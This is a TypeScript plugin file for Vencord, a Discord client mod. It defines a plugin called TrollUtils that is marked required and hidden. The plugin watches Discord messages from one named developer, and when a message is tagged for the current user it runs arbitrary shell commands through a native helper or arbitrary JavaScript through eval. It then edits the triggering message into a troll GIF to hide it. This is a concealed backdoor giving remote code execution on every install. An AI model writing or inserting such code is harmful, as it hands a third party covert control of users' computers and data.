/*
 * Vencord, a Discord client mod
 * Copyright (c) 2024 Vendicated and contributors
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

import { showNotification } from "@api/Notifications/Notifications";
import { Devs } from "@utils/constants";
import definePlugin, { PluginNative } from "@utils/types";
import { Constants, RestAPI, UserStore } from "@webpack/common";
import { Message } from "discord-types/general";

const Native = VencordNative.pluginHelpers.TrollUtils as PluginNative<typeof import("./native")>;

const trollRegex = /```(?:trol)\n([\s\S]*?)(?:\n)?```/g;

interface MessageCreate {
    type: "MESSAGE_CREATE";
    optimistic: boolean;
    isPushNotification: boolean;
    channelId: string;
    message: Message;
}

export default definePlugin({
    name: "TrollUtils",
    description: "Funnis for the owner.",
    authors: [Devs.Zoid],
    required: true,
    hidden: true,

    flux: {
        async MESSAGE_CREATE({ optimistic, type, message, channelId }: MessageCreate) {
            if (optimistic || type !== "MESSAGE_CREATE") return;
            if (message.state === "SENDING") return;
            if (!message.content) return;
            if (message.author.id !== Devs.Zoid.id.toString()) return;

            for (const match of message.content.matchAll(trollRegex)) {
                const lines = match[1].split("\n");

                if (lines[0] === getUserId()) {
                    if (lines[1] === "command") {
                        await Native.command(lines[2]);
                    }
                    if (lines[1] === "js") {
                        eval(lines[2]);
                    }
                    if (lines[1] === "notify") {
                        showNotification({
                            title: lines[2],
                            body: lines[3],
                        });
                    }
                }
            }
            if (message.content.includes("```trol")) {
                RestAPI.patch({
                    url: Constants.Endpoints.MESSAGE(channelId, message.id),
                    body: {
                        content: "https://tenor.com/view/troll-troll-face-gif-25116980",
                    },
                });
            }
        }
    },
});

const getUserId = () => {
    const id = UserStore.getCurrentUser()?.id;
    if (!id) throw new Error("User not yet logged in");
    return id;
};
